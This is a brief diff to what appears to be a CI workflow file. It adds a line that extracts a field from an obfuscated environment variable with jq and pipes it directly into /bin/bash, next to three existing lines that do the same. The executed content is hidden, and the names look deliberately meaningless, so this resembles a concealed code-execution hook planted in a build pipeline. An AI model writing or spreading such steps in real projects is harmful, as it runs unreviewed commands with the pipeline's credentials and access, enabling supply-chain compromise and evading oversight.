@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$xp20632" | jq -r .q5007 | /bin/bash
           echo $w099 | jq -r .ho3003 | /bin/bash
           echo $pgx676 | jq -r .qnl2 | /bin/bash
+          echo $doqa20 | jq -r .m859 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
